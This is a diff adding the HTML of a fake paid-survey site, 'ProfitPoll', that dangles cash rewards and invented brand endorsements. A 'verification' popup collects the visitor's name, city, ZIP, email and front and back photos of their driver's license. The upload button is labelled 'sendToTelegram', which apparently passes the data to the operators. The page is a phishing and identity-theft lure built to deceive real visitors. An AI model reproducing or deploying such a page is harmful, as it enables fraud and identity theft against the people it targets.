@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProfitPoll</title>
+    <link rel="stylesheet" href="./css/styleUpdatedV1.css">
+    <script src="./js/mainUpdated.js" defer></script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <span class="overlay"></span>
+    <header>
+        <div class="header-container">
+            <h1 class="header-logo">ProfitPoll</h1>
+
+            <div class="header-menu">
+                <a href="./index.html" class="header-menu__item">Main</a>
+                <a href="#about" class="header-menu__item">About us</a>
+                <a href="#survey" class="header-menu__item">Survey</a>
+                <a href="#survey" class="header-menu__item">Receive money</a>
+
+                <div class="header-balance-menu">
+                    <p class="header-balance__text">Your wallet:</p>
+                    <p class="header-balance__cost">0 $</p>
+                    <button class="header-receive__button" style="z-index: 1000;">Receive money</button>
+                </div>
+            </div>
+
+            <div class="header-balance">
+                <p class="header-balance__text">Your wallet:</p>
+                <p class="header-balance__cost">0 $</p>
+                <button class="header-receive__button" style="z-index: 1000;">Receive money</button>
+            </div>
+
+            <div id="popup" class="popup-container">
+                <div class="popup-page active" data-page="1">
+                    <p class="popup-first__title">To receive the money, go through verification</p>
+                    <p class="popup-first__subtitle">Our experts will check that you are not a robot and send you a reward.</p>
+
+                    <img src="./img/popup/Frame1.png" alt="" class="popup-first__pictureFirst">
+                    <img src="./img/popup/Frame2.png" alt="" class="popup-first__pictureSecond">
+                    <img src="./img/popup/Frame3.png" alt="" class="popup-first__pictureThird">
+                    <img src="./img/popup/Frame4.png" alt="" class="popup-first__pictureFourth">
+                    <img src="./img/popup/Frame5.png" alt="" class="popup-first__pictureCenter">
+
+                    <button class="popup-first__button next-page" data-next="2">Pass verification</button>
+                </div>
+
+                <div class="popup-page" data-page="2">
+                    <p class="popup-first__title">To receive the money, go through verification</p>
+                    <p class="popup-first__subtitle">Our experts will check that you are not a robot and send you a reward.</p>
+
+                    <div class="contact-form-wrapper">
+                        <form id="contactForm" action="" class="contact-form">
+                            <div class="contact-form-item">
+                                <label for="contact-form-name" class="">Name</label>
+                                <input id="contact-form-name" type="text" name="name" class="contact-form-name" placeholder="" required>
+                                <span class="error-message" id="name-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-surname" class="">Last Name</label>
+                                <input id="contact-form-surname" type="text" name="surname" class="contact-form-surname" placeholder="" required>
+                                <span class="error-message" id="surname-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-address" class="">City</label>
+                                <input id="contact-form-address" type="text" name="address" class="contact-form-address" placeholder="" required>
+                                <span class="error-message" id="address-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-ZIPCode" class="">ZIP-Code</label>
+                                <input id="contact-form-ZIPCode" type="number" name="ZIPCode" class="contact-form-ZIPCode" placeholder="" required>
+                                <span class="error-message" id="ZIPCode-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-mail" class="">E-Mail</label>
+                                <input id="contact-form-mail" type="email" name="email" class="contact-form-mail" placeholder="" required>
+                                <span class="error-message" id="email-error"></span>
+                            </div>
+                        </form>
+                    </div>
+
+                    <button class="popup-first__button next-page" data-next="3">Next</button>
+                </div>
+
+                <div class="popup-page" data-page="3">
+                    <p class="popup-first__title">Confirm your identity</p>
+                    <p class="popup-first__subtitle">Upload the driver's license from 2 sides and send it for verification</p>
+
+                    <div class="file-upload-wrapper">
+                        <input type="file" id="frontSide" accept="image/*" class="file-input" data-side="front">
+                        <label for="frontSide" class="popup-photo__place">
+                            <span class="upload-text">The front side</span>
+                            <span class="upload-icon">📷</span>
+                        </label>
+
+                        <input type="file" id="backSide" accept="image/*" class="file-input" data-side="back">
+                        <label for="backSide" class="popup-photo__place">
+                            <span class="upload-text">Back side</span>
+                            <span class="upload-icon">📷</span>
+                        </label>
+
+                        <div class="upload-preview" id="uploadPreview"></div>
+                    </div>
+
+                    <button class="popup-first__button" id="sendToTelegram">Send for verification</button>
+                </div>
+
+                <div class="popup-page" data-page="4">
+                    <img src="./img/popup/nice.png" alt="" class="popup-nice">
+
+                    <p class="popup-first__title">Your data is being verified</p>
+                    <p class="popup-first__subtitle">The data is processed within 24 hours. We will send you information about the funds by mail.</p>
+
+                    <button class="popup-first__button close-popup">Next</button>
+                </div>
+            </div>
+
+            <button class="burger-btn" aria-label="Menu">
+                <span class="burger-line"></span>
+                <span class="burger-line"></span>
+                <span class="burger-line"></span>
+            </button>
+        </div>
+    </header>
+
+    <main>
+        <section class="intro">
+            <div class="intro-container">
+                <div class="intro-left">
+                    <div class="intro-left__top">
+                        <h1 class="intro-left__title">
+                            Survey by Echo Insights
+                        </h1>
+
+                        <h2 class="intro-left__subtitle">
+                            Your opinion matters - get rewarded!
+                        </h2>
+
+                        <p class="intro-left__text">
+                            Echo Insights is a leading global marketing analytics and consumer research company. We are committed to understanding people's real preferences, values and expectations - and it's up to you to help us do just that.<br><br>
+                            Take the survey and be rewarded for your opinion. It only takes a few minutes, and your answers will help big brands better adapt to the needs of real users.
+                        </p>
+
+                        <p class="intro-left__text">
+                            What you'll get:<br>
+                            +$50 dollars to your internal wallet for participating<br>
+                            Opportunity to influence future products and services<br>
+                            Recognition for your contribution to the development of the researched areas
+                        </p>
+
+                        <a href="#survey" class="intro-left__button">
+                            Go to the survey
+                            <img src="./img/arrow.svg" alt="">
+                        </a>
+                    </div>
+                    
+                    <div class="intro-left__bottom">
+                        <p class="intro-left__bottom-text">More than 100 people have already participated. Join us!</p>
+
+                        <div class="intro-left__bottom-subs">
+                            <div class="intro-left__bottom-subs__persons">
+                                <img src="./img/first_person.png" alt="Person" class="person">
+                                <img src="./img/second_person.png" alt="Person" class="person">
+                                <img src="./img/third_person.png" alt="Person" class="person">
+                                <img src="./img/fouth_person.png" alt="Person" class="person">
+                                <img src="./img/fifth_person.png" alt="Person" class="person">
+                            </div>
+                            <p class="intro-left__bottom-subs__number">100+</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="intro-right">
+                    <img class="intro__picture" src="./img/girl.png" alt="">
+                </div>
+            </div>
+        </section>
+
+        <section class="survey" id="survey">
+            <div class="survey-container">
+
+                <div class="quiz-container">
+                    <!-- Demographic questions -->
+                    <div class="quiz-slide active">
+                        <p class="quiz-number">1 of 24</p>
+                        <h2>Your gender</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="gender" value="Male">
+                            <span class="checkmark"></span>
+                            Male
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="gender" value="Female">
+                            <span class="checkmark"></span>
+                            Female
+                        </label>
+                        <div class="specify-container">
+                            <label id="spec" class="option">
+                            <input type="radio" name="gender" value="Other">
+                            <span class="checkmark"></span>
+                            Other (specify)
+                            </label>
+                            <textarea type="text" class="specify-input" placeholder="Type your answer..."></textarea>
+                        </div>
+                        
+                        </div>
+                            <div class="navigation">
+                            <button class="prev-btn" disabled>Previous</button>
+                            <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">2 of 24</p>
+                        <h2>Your age</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="age" value="Under 18">
+                            <span class="checkmark"></span>
+                            Under 18
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="age" value="18-24">
+                            <span class="checkmark"></span>
+                            18-24
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="age" value="25-34">
+                            <span class="checkmark"></span>
+                            25-34
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="age" value="35-44">
+                            <span class="checkmark"></span>
+                            35-44
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="age" value="45-54">
+                            <span class="checkmark"></span>
+                            45-54
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="age" value="55+">
+                            <span class="checkmark"></span>
+                            55+
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">3 of 24</p>
+                        <h2>Where do you live</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="location" value="City">
+                            <span class="checkmark"></span>
+                            City
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="location" value="Suburb">
+                            <span class="checkmark"></span>
+                            Suburb
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="location" value="Village/countryside">
+                            <span class="checkmark"></span>
+                            Village/countryside
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <p class="quiz-number">4 of 24</p>
+                        <h2>Your level of education?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="pets" value="Secondary">
+                            <span class="checkmark"></span>
+                            Secondary
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="pets" value="Secondary specialized">
+                            <span class="checkmark"></span>
+                            Secondary specialized
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="pets" value="Unfinished higher">
+                            <span class="checkmark"></span>
+                            Unfinished higher
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">5 of 24</p>
+                        <h2>Your current employment?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="circus" value="Working full-time">
+                            <span class="checkmark"></span>
+                            Working full-time
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="circus" value="Working part-time">
+                            <span class="checkmark"></span>
+                            Working part-time
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="circus" value="Studying">
+                            <span class="checkmark"></span>
+                            Studying
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="circus" value="Not working or studying">
+                            <span class="checkmark"></span>
+                            Not working or studying
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="circus" value="Retired">
+                            <span class="checkmark"></span>
+                            Retired
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">6 of 24</p>
+                        <h2>How many people live with you in the same apartment/house (including you)?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="dog" value="1">
+                            <span class="checkmark"></span>
+                            1
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="dog" value="2">
+                            <span class="checkmark"></span>
+                            2
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="dog" value="3">
+                            <span class="checkmark"></span>
+                            3
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="dog" value="4">
+                            <span class="checkmark"></span>
+                            4
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="dog" value="5">
+                            <span class="checkmark"></span>
+                            5
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <h2>Let`s celebrate!</h2>
+                        <p>You were credited with $10</p>
+                        <img src="./img/gift.png" alt="">
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="skip-btn">Next</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">7 of 24</p>
+                        <h2>How often do you shop online (Amazon, Walmart, etc.)?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="truth" value="Almost every day">
+                            <span class="checkmark"></span>
+                            Almost every day
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="truth" value="A few times a week">
+                            <span class="checkmark"></span>
+                            A few times a week
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="truth" value="Rarely, I prefer to store">
+                            <span class="checkmark"></span>
+                            Rarely, I prefer to store 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="truth" value="Don't use at all.">
+                            <span class="checkmark"></span>
+                            Don't use at all. 
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">8 of 24</p>
+                        <h2>Would you give up your car if your city had perfect public transportation?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="steal" value="No, a car is freedom ">
+                            <span class="checkmark"></span>
+                            No, a car is freedom 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="steal" value="Yes, if transportation was convenient">
+                            <span class="checkmark"></span>
+                            Yes, if transportation was convenient
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="steal" value="Maybe, but I doubt it.">
+                            <span class="checkmark"></span>
+                            Maybe, but I doubt it.
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">9 of 24</p>
+                        <h2>What food delivery service do you use most often?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="fate" value="DoorDash">
+                            <span class="checkmark"></span>
+                            DoorDash
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="fate" value="Uber Eats">
+                            <span class="checkmark"></span>
+                            Uber Eats
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="fate" value="Grubhub">
+                            <span class="checkmark"></span>
+                            Grubhub 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="fate" value="Pick up myself(s)">
+                            <span class="checkmark"></span>
+                            Pick up myself(s)
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="fate" value="Technology and the Future">
+                            <span class="checkmark"></span>
+                            Technology and the Future
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <p class="quiz-number">10 of 24</p>
+                        <h2>How do you feel about artificial intelligence (ChatGPT, neural networks, etc.)?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="animals" value="It's the future, I'm in favor of progress ">
+                            <span class="checkmark"></span>
+                            It's the future, I'm in favor of progress 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="animals" value="We need strict laws to control">
+                            <span class="checkmark"></span>
+                            We need strict laws to control
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="animals" value="AI I'm afraid">
+                            <span class="checkmark"></span>
+                            AI I'm afraid
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="animals" value="AI will take our jobs I don't care">
+                            <span class="checkmark"></span>
+                            AI will take our jobs I don't care
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">11 of 24</p>
+                        <h2>Would you accept a microchip in your hand if it replaced all cards and documents?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Yes, it's convenient">
+                            <span class="checkmark"></span>
+                            Yes, it's convenient 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="No, it's like a dystopian movie">
+                            <span class="checkmark"></span>
+                            No, it's like a dystopian movie
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Maybe if it was 100% secure">
+                            <span class="checkmark"></span>
+                            Maybe if it was 100% secure
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">12 of 24</p>
+                        <h2>Which gadget is most important to you?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="future" value="Smartphone">
+                            <span class="checkmark"></span>
+                            Smartphone
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="future" value="Laptop">
+                            <span class="checkmark"></span>
+                            Laptop
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="future" value="Headphones">
+                            <span class="checkmark"></span>
+                            Headphones
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="future" value="Smart watches">
+                            <span class="checkmark"></span>
+                            Smart watches
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="future" value="Living without gadgets">
+                            <span class="checkmark"></span>
+                            Living without gadgets
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="future" value="Health and relationships">
+                            <span class="checkmark"></span>
+                            Health and relationships
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Let`s celebrate!</h2>
+                        <p>You were credited with $20</p>
+                        <img src="./img/gift.png" alt="">
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="skip-btn">Next</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">13 of 24</p>
+                        <h2>How often do you exercise?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Daily">
+                            <span class="checkmark"></span>
+                            Daily 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="2-3 times a week">
+                            <span class="checkmark"></span>
+                            2-3 times a week
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Rarely">
+                            <span class="checkmark"></span>
+                            Rarely
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Never">
+                            <span class="checkmark"></span>
+                            Never
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">14 of 24</p>
+                        <h2>Do you watch your diet?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Strictly">
+                            <span class="checkmark"></span>
+                            Strictly 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Sometimes">
+                            <span class="checkmark"></span>
+                            Sometimes
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="No">
+                            <span class="checkmark"></span>
+                            No
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">15 of 24</p>
+                        <h2>How often do you check your health?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Once a year">
+                            <span class="checkmark"></span>
+                            Once a year 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Only when I'm sick">
+                            <span class="checkmark"></span>
+                            Only when I'm sick
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Never">
+                            <span class="checkmark"></span>
+                            Never
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">16 of 24</p>
+                        <h2>Are you happy?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Yes">
+                            <span class="checkmark"></span>
+                            Yes 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="More like yes">
+                            <span class="checkmark"></span>
+                            More like yes
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="More like no">
+                            <span class="checkmark"></span>
+                            More like no
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="No">
+                            <span class="checkmark"></span>
+                            No
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">17 of 24</p>
+                        <h2>Coffee or tea?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Coffee">
+                            <span class="checkmark"></span>
+                            Coffee 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Tea">
+                            <span class="checkmark"></span>
+                            Tea
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Nothing">
+                            <span class="checkmark"></span>
+                            Nothing
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">18 of 24</p>
+                        <h2>Would you rather live by the ocean or in the mountains?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Ocean">
+                            <span class="checkmark"></span>
+                            Ocean 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Mountains">
+                            <span class="checkmark"></span>
+                            Mountains
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="City">
+                            <span class="checkmark"></span>
+                            City
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Let`s celebrate!</h2>
+                        <p>You were credited with $10</p>
+                        <img src="./img/gift.png" alt="">
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="skip-btn">Next</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">19 of 24</p>
+                        <h2>What memory makes you smile even on a bad day?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="A childhood story">
+                            <span class="checkmark"></span>
+                            A childhood story 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="A vivid journey">
+                            <span class="checkmark"></span>
+                            A vivid journey
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="A romantic moment">
+                            <span class="checkmark"></span>
+                            A romantic moment
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="A personal accomplishment">
+                            <span class="checkmark"></span>
+                            A personal accomplishment
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">20 of 24</p>
+                        <h2>A pet What gives you goosebumps?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="A certain song">
+                            <span class="checkmark"></span>
+                            A certain song 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="A movie/series">
+                            <span class="checkmark"></span>
+                            A movie/series
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="A view of nature">
+                            <span class="checkmark"></span>
+                            A view of nature
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Nostalgia Nothing">
+                            <span class="checkmark"></span>
+                            Nostalgia Nothing
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">21 of 24</p>
+                        <h2>What situation scares you the most?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Financial disaster">
+                            <span class="checkmark"></span>
+                            Financial disaster 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Serious illness">
+                            <span class="checkmark"></span>
+                            Serious illness
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Loss of a loved one Loneliness">
+                            <span class="checkmark"></span>
+                            Loss of a loved one Loneliness
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Technological collapse">
+                            <span class="checkmark"></span>
+                            Technological collapse
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">22 of 24</p>
+                        <h2>What would you save from a burning house (after family)?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Phone">
+                            <span class="checkmark"></span>
+                            Phone 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Photo album Jewelry">
+                            <span class="checkmark"></span>
+                            Photo album Jewelry
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Creative work">
+                            <span class="checkmark"></span>
+                            Creative work
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Children's toy">
+                            <span class="checkmark"></span>
+                            Children's toy
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">23 of 24</p>
+                        <h2>What movie made you cry?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Hachiko">
+                            <span class="checkmark"></span>
+                            Hachiko 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Interstellar">
+                            <span class="checkmark"></span>
+                            Interstellar
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Titanic">
+                            <span class="checkmark"></span>
+                            Titanic
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Alien">
+                            <span class="checkmark"></span>
+                            Alien
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="None">
+                            <span class="checkmark"></span>
+                            None
+                        </label>
+                        </div>
+                        <div class="navigation">
+                        <button class="prev-btn">Previous</button>
+                        <button class="next-btn" disabled>Next question</button>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <p class="quiz-number">24 of 24</p>
+                        <h2>What does a perfect day mean to you?</h2>
+                        <div class="options-container">
+                        <label class="option">
+                            <input type="radio" name="live" value="Mornings without an alarm clock">
+                            <span class="checkmark"></span>
+                            Mornings without an alarm clock 
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Beach/nature">
+                            <span class="checkmark"></span>
+                            Beach/nature
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Party with friends">
+                            <span class="checkmark"></span>
+                            Party with friends
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Doing nothing">
+                            <span class="checkmark"></span>
+                            Doing nothing
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="live" value="Good food">
+                            <span class="checkmark"></span>
+                            Good food
+                        </label>
+                        </div>
+                        <div class="navigation">
+                            <button class="prev-btn">Previous</button>
+                            <button class="next-btn">Finish</button>
+                        </div>
+                    </div>
+
+                    <!-- Thank you slide -->
+                    <div class="quiz-slide">
+                        <h2>Let`s celebrate!</h2>
+                        <p>
+                            Your balance is $60. Thank you for participating!<br>
+                            You can now withdraw the funds to your account.
+                        </p>
+                        <img src="./img/gift.png" alt="">
+                        <button class="quiz-slide__finish-button header-receive__button">Claim</button>
+                    </div>
+                </div>
+
+
+            </div>
+        </section>
+
+        <section id="about" class="about">
+            <div class="about-container">
+                <div class="about-left">
+                    <h1 class="about-left__title">
+                        Why Participate in Our Surveys?
+                    </h1>
+
+                    <h2 class="about-left__subtitle">
+                        We connect real people with real brands to help shape the future of products and services. Our platform allows users to earn cash rewards by sharing their honest opinions through quick and easy surveys.<br><br>
+                        Trusted by global brands like BMW, The North Face, HUAWEI, Dyson, and many more, we make your voice matter. Every response influences decisions, improves experiences, and drives innovation.<br><br>
+                        Join us and start turning your feedback into real impact—and real rewards.
+                    </h2>
+
+                    <div class="about-left__info">
+                        <p class="about-left__info-title">
+                            Quick & Easy: Surveys take just a few minutes to complete.
+                        </p>
+                        <ul class="about-left__info-list">
+                            <li class="about-left__info-list__item">
+                                Cash Rewards: Earn [Amount] for each survey you finish.
+                            </li>
+
+                            <li class="about-left__info-list__item">
+                                Impactful: Your feedback helps shape products and services.
+                            </li>
+
+                            <li class="about-left__info-list__item">
+                                Secure & Confidential: Your data is protected.
+                            </li>
+                        </ul>
+                    </div>
+
+                    <a href="#survey" class="about-left__button">
+                        Go to the survey
+                        <img src="./img/arrow.svg" alt="arrow">
+                    </a>
+                </div>
+
+                <div class="about-right">
+                    <img src="./img/bmw.png" alt="BMW" class="about-right__picture">
+                    <img src="./img/belle.png" alt="Belle" class="about-right__picture">
+                    <img src="./img/huawei.png" alt="Huawei" class="about-right__picture">
+                    <img src="./img/tnf.png" alt="TNF" class="about-right__picture">
+                    <img src="./img/dyson.png" alt="Dyson" class="about-right__picture">
+                </div>
+            </div>
+        </section>
+    </main>
+
+    
+</body>
+</html>
